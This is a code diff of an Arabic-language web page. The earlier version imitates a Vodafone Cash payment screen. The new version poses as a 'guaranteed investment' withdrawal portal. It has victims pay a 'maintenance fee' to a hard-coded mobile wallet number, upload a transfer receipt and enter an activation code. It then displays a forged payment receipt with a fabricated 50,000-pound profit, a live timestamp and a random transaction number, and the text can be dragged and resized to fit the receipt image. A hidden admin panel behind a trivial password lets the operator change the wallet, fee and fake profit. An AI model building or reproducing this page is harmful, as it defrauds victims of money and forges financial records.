@@ -3,125 +3,208 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>فودافون كاش</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
+    <title>بوابة الصرف الرقمي | الاستثمار المضمون</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
-        body { margin: 0; font-family: 'Cairo', sans-serif; background: #f4f4f4; }
+        :root { --blue: #0046af; --dark-blue: #002d72; --light-bg: #f4f7fe; --green: #28a745; --red: #d9534f; }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--light-bg); color: #333; transition: 0.3s; }
+        .protected { user-select: none; -webkit-user-select: none; }
         
-        /* واجهة الموقع الأصلية (قبل الوصول للصورة) */
-        #main-site { padding: 20px; text-align: center; }
-        .step-card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px; }
-        .btn-pay { background: #e60000; color: white; padding: 15px 40px; border: none; border-radius: 25px; font-weight: bold; width: 100%; cursor: pointer; }
+        nav { background: var(--blue); color: white; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .logo { font-weight: 900; font-size: 20px; }
+        .nav-links span { cursor: pointer; font-size: 13px; font-weight: 600; padding: 8px 12px; }
+        .nav-links span.active { background: rgba(255,255,255,0.2); border-radius: 8px; }
 
-        /* حاوية الصورة النهائية */
-        #final-receipt { display: none; position: relative; width: 100%; max-width: 420px; margin: 0 auto; overflow: hidden; }
+        .timer-bar { background: var(--red); color: white; text-align: center; padding: 6px; font-size: 12px; font-weight: bold; }
+        .container { max-width: 480px; margin: 15px auto; padding: 0 15px; padding-bottom: 100px; }
+        .card { background: white; border-radius: 25px; padding: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.07); margin-bottom: 20px; border-top: 6px solid var(--blue); position: relative; }
+        .page { display: none; }
+        .page.active { display: block; }
+        
+        .wallet-box { background: #fff5f5; color: var(--red); padding: 18px; border-radius: 15px; text-align: center; font-size: 26px; font-weight: 900; margin: 15px 0; border: 2px dashed var(--red); cursor: pointer; }
+        
+        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #555; }
+        input { width: 100%; padding: 15px; margin-bottom: 18px; border: 1px solid #ddd; border-radius: 12px; font-family: 'Cairo'; box-sizing: border-box; outline: none; }
+        
+        .btn-main { width: 100%; padding: 18px; border-radius: 15px; border: none; background: var(--blue); color: white; font-weight: 900; cursor: pointer; font-size: 16px; }
+
+        .verify-box { background: #f0f4ff; border: 2px dashed var(--blue); padding: 20px; border-radius: 20px; margin-top: 15px; display: none; text-align: center; }
+
+        /* --- استايل الإيصال الجديد (الصورة مع التحكم) --- */
+        #payment-section { position: relative; width: 100%; max-width: 420px; margin: 0 auto; overflow: hidden; background: #fff; }
         .base-img { width: 100%; display: block; }
+        .drag-item { position: absolute; font-weight: 900; font-family: Arial; white-space: nowrap; cursor: move; touch-action: none; z-index: 10; }
+        #val-amt { top: 64.5%; left: 16%; color: #0b5155; font-size: 17px; } /* اللون الزيتي المطلوب */
+        #val-dt { top: 71.2%; left: 16%; color: #000; font-size: 13px; }
+        #val-num { top: 75.2%; left: 16%; color: #000; font-size: 14px; }
 
-        /* النصوص القابلة للتحريك */
-        .draggable {
-            position: absolute;
-            cursor: move;
-            user-select: none;
-            touch-action: none;
-            color: #000;
-            white-space: nowrap;
-            font-weight: 900;
-            font-family: Arial, sans-serif;
-        }
+        .size-controls { background: rgba(0,0,0,0.8); color: white; padding: 15px; border-radius: 15px; margin-top: 10px; font-size: 11px; }
+        .size-controls div { display: flex; align-items: center; justify-content: space-between; margin-bottom: 5px; }
+        /* ------------------------------------------- */
 
-        #drag-amount { top: 64.5%; left: 16%; font-size: 17px; }
-        #drag-date { top: 68.5%; right: 16%; font-size: 13px; }
-        #drag-id { top: 72.5%; right: 16%; font-size: 14px; }
-
-        /* لوحة التحكم */
-        #admin { display:none; position:fixed; inset:0; background:white; z-index:1000; padding:20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; }
-        .trigger { position:fixed; bottom:0; left:0; width:50px; height:50px; z-index:1001; }
+        #admin-panel { display:none; position:fixed; inset:0; background:white; z-index:9999; padding:30px; overflow-y: auto; }
+        .admin-trigger { position: fixed; bottom: 0; right: 0; width: 40px; height: 40px; z-index: 10000; opacity: 0; }
     </style>
 </head>
-<body>
+<body class="protected">
 
-<div class="trigger" onclick="checkPass()"></div>
+<div class="timer-bar">🔒 جلسة آمنة: ينتهي الوقت خلال <span id="timer">15:00</span></div>
 
-<!-- الجزء الأول: الموقع كما كان -->
-<div id="main-site">
-    <div class="step-card">
-        <h3>تأكيد دفع الرسوم</h3>
-        <p>برجاء الضغط على الزر أدناه لإتمام العملية</p>
-        <button class="btn-pay" onclick="showReceipt()">تأكيد الدفع</button>
+<nav>
+    <div class="logo">الاستثمار المضمون</div>
+    <div class="nav-links">
+        <span id="n-home" class="active" onclick="showPage('home')">الرئيسية</span>
+        <span id="n-payments" onclick="showPage('payments')">المدفوعات</span>
+    </div>
+</nav>
+
+<div class="container">
+    <!-- الصفحة الرئيسية -->
+    <div id="home" class="page active">
+        <div class="card">
+            <h2 style="margin:0; color:var(--blue); text-align: center;">طلب سحب الأرباح</h2>
+            <p style="font-size:12px; text-align:center; color:#777;">برجاء سداد رسوم الصيانة (<b id="f-fees">500</b> ج.م)</p>
+            <div class="wallet-box" id="f-wallet" onclick="copyWallet()">01226811784</div>
+            <label>اسم المستلم:</label>
+            <input type="text" id="uName" placeholder="أدخل اسمك الكامل">
+            <label>رقم محفظة الاستلام:</label>
+            <input type="tel" id="uPhone" placeholder="01xxxxxxxxx">
+            <label>إرفاق إيصال التحويل:</label>
+            <input type="file" id="uFile" accept="image/*">
+            <button class="btn-main" onclick="submitRequest()">تأكيد وإرسال الطلب</button>
+        </div>
+    </div>
+
+    <!-- صفحة المتابعة والكود -->
+    <div id="payments" class="page">
+        <div class="card">
+            <h2 style="color:var(--blue);">متابعة الطلب</h2>
+            <div id="p-data" style="text-align: center; padding: 15px; border-radius: 12px; background: #fafafa; font-size: 13px;">لا توجد طلبات.</div>
+            <div id="v-box" class="verify-box">
+                <p style="font-size:12px; color:#666;">أدخل "كود التفعيل" لإتمام عملية التحويل الفوري.</p>
+                <input type="text" id="activeCode" placeholder="كود التفعيل">
+                <button class="btn-main" style="background:var(--green);" onclick="verifyCode()">تحويل المبلغ الآن</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- صفحة الإيصال النهائي (الصورة) -->
+    <div id="final" class="page">
+        <div id="payment-section">
+            <img src="image_5.png.jpg" class="base-img">
+            <div id="val-amt" class="drag-item">--</div>
+            <div id="val-dt" class="drag-item">--</div>
+            <div id="val-num" class="drag-item">--</div>
+        </div>
+
+        <div class="size-controls">
+            <div><span>حجم المبلغ:</span> <input type="range" min="10" max="40" value="17" oninput="changeSize('val-amt', this.value)"></div>
+            <div><span>حجم التاريخ:</span> <input type="range" min="8" max="30" value="13" oninput="changeSize('val-dt', this.value)"></div>
+            <div><span>حجم المرجع:</span> <input type="range" min="8" max="30" value="14" oninput="changeSize('val-num', this.value)"></div>
+            <button onclick="location.reload()" style="width:100%; margin-top:10px; background:red; color:white; border:none; padding:5px; border-radius:5px;">خروج نهائي</button>
+        </div>
     </div>
 </div>
 
-<!-- الجزء الثاني: الصورة النهائية -->
-<div id="final-receipt">
-    <img src="image_5.png.jpg" class="base-img">
-    
-    <!-- النصوص التي طلبتها فقط مع ميزة التحريك -->
-    <div id="drag-amount" class="draggable">50,000.00 جنيه</div>
-    <div id="drag-date" class="draggable">--/--/----</div>
-    <div id="drag-id" class="draggable">35xxxxxxx</div>
-</div>
+<div class="admin-trigger" onclick="handleAdminLogin()"></div>
 
-<!-- لوحة التحكم في المبلغ -->
-<div id="admin">
-    <h3>تعديل المبلغ فقط</h3>
-    <input type="text" id="new-amount" placeholder="اكتب المبلغ الجديد هنا">
-    <button class="btn-pay" onclick="updateAmount()">تحديث وعرض الصورة</button>
+<div id="admin-panel">
+    <h3>⚙️ إعدادات المدير</h3>
+    <label>رقم محفظة الاستقبال:</label>
+    <input type="text" id="s-wallet">
+    <label>رسوم الصيانة:</label>
+    <input type="number" id="s-fees">
+    <label>مبلغ الربح في الإيصال:</label>
+    <input type="number" id="s-profit">
+    <label>كود التفعيل:</label>
+    <input type="text" id="s-code">
+    <button class="btn-main" style="background:var(--green);" onclick="saveAdmin()">حفظ التعديلات</button>
+    <button class="btn-main" style="background:#666; margin-top:10px;" onclick="location.reload()">خروج</button>
 </div>
 
 <script>
-    function checkPass() {
-        let p = prompt("الباسورد:");
-        if(p==="0" || p==="1") document.getElementById('admin').style.display='block';
+    let config = JSON.parse(localStorage.getItem('siteConfigV4')) || { profit: 50000, fees: 500, wallet: '01226811784', code: '9900' };
+
+    function applyConfig() {
+        document.getElementById('f-fees').innerText = config.fees;
+        document.getElementById('f-wallet').innerText = config.wallet;
+        document.getElementById('s-profit').value = config.profit;
+        document.getElementById('s-fees').value = config.fees;
+        document.getElementById('s-wallet').value = config.wallet;
+        document.getElementById('s-code').value = config.code;
+    }
+    applyConfig();
+
+    function showPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.querySelectorAll('.nav-links span').forEach(s => s.classList.remove('active'));
+        if(id === 'home') document.getElementById('n-home').classList.add('active');
+        if(id === 'payments') document.getElementById('n-payments').classList.add('active');
     }
 
-    function updateAmount() {
-        let amt = document.getElementById('new-amount').value;
-        if(amt) document.getElementById('drag-amount').innerText = amt + " جنيه";
-        document.getElementById('admin').style.display='none';
+    function submitRequest() {
+        const name = document.getElementById('uName').value;
+        if(!name || !document.getElementById('uFile').files[0]) return alert("أكمل البيانات");
+        document.getElementById('p-data').innerHTML = `<b>الاسم:</b> ${name}<br><span style="color:red">بانتظار كود التفعيل</span>`;
+        document.getElementById('v-box').style.display = 'block';
+        showPage('payments');
     }
 
-    function showReceipt() {
-        document.getElementById('main-site').style.display = 'none';
-        document.getElementById('final-receipt').style.display = 'block';
-        
-        // ضبط التاريخ التلقائي
-        let now = new Date();
-        document.getElementById('drag-date').innerText = now.toLocaleTimeString('en-GB', {hour:'2-digit', minute:'2-digit'}) + " - " + now.toLocaleDateString('en-GB');
-        // رقم عملية عشوائي
-        document.getElementById('drag-id').innerText = "35" + Math.floor(Math.random() * 900000000);
+    function verifyCode() {
+        if(document.getElementById('activeCode').value === config.code) {
+            showPage('final');
+            document.getElementById('val-amt').innerText = config.profit + " جنيه";
+            let now = new Date();
+            document.getElementById('val-dt').innerText = now.toLocaleTimeString('en-GB', {hour:'2-digit', minute:'2-digit'}) + " - " + now.toLocaleDateString('en-GB');
+            document.getElementById('val-num').innerText = "35" + Math.floor(Math.random() * 900000000);
+        } else { alert("الكود خطأ"); }
     }
 
-    // كود التحريك (Drag & Drop) للموبايل والكمبيوتر
-    const draggables = document.querySelectorAll('.draggable');
-    draggables.forEach(el => {
-        let isDragging = false;
-        el.addEventListener('mousedown', start);
-        el.addEventListener('touchstart', start);
+    function changeSize(id, size) { document.getElementById(id).style.fontSize = size + "px"; }
 
-        function start(e) {
-            isDragging = true;
-            let event = e.type === 'touchstart' ? e.touches[0] : e;
-            let shiftX = event.clientX - el.getBoundingClientRect().left;
-            let shiftY = event.clientY - el.getBoundingClientRect().top;
+    function handleAdminLogin() { if (prompt("الرمز:") === "1") document.getElementById('admin-panel').style.display = 'block'; }
 
-            function move(e) {
-                if (!isDragging) return;
-                let ev = e.type === 'touchmove' ? e.touches[0] : e;
-                let parent = document.getElementById('final-receipt').getBoundingClientRect();
-                el.style.left = ((ev.clientX - parent.left - shiftX) / parent.width * 100) + '%';
-                el.style.top = ((ev.clientY - parent.top - shiftY) / parent.height * 100) + '%';
+    function saveAdmin() {
+        config = {
+            profit: document.getElementById('s-profit').value,
+            fees: document.getElementById('s-fees').value,
+            wallet: document.getElementById('s-wallet').value,
+            code: document.getElementById('s-code').value
+        };
+        localStorage.setItem('siteConfigV4', JSON.stringify(config));
+        location.reload();
+    }
+
+    // نظام التحريك (Drag)
+    const items = document.querySelectorAll('.drag-item');
+    items.forEach(el => {
+        let active = false, currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;
+        const dragStart = (e) => {
+            initialX = (e.type === "touchstart" ? e.touches[0].clientX : e.clientX) - xOffset;
+            initialY = (e.type === "touchstart" ? e.touches[0].clientY : e.clientY) - yOffset;
+            if (e.target === el) active = true;
+        };
+        const dragMove = (e) => {
+            if (active) {
+                e.preventDefault();
+                currentX = (e.type === "touchmove" ? e.touches[0].clientX : e.clientX) - initialX;
+                currentY = (e.type === "touchmove" ? e.touches[0].clientY : e.clientY) - initialY;
+                xOffset = currentX; yOffset = currentY;
+                el.style.transform = `translate3d(${currentX}px, ${currentY}px, 0)`;
             }
-
-            function stop() { isDragging = false; }
-
-            document.addEventListener('mousemove', move);
-            document.addEventListener('touchmove', move);
-            document.addEventListener('mouseup', stop);
-            document.addEventListener('touchend', stop);
-        }
+        };
+        el.addEventListener("touchstart", dragStart); el.addEventListener("touchmove", dragMove);
+        el.addEventListener("mousedown", dragStart); el.addEventListener("mousemove", dragMove);
+        window.addEventListener("touchend", () => active = false); window.addEventListener("mouseup", () => active = false);
     });
-</script>
 
+    let time = 900;
+    setInterval(() => {
+        let m = Math.floor(time/60); let s = time % 60;
+        document.getElementById('timer').innerText = `${m}:${s < 10 ? '0'+s : s}`;
+        if(time > 0) time--;
+    }, 1000);
+</script>
 </body>
 </html>
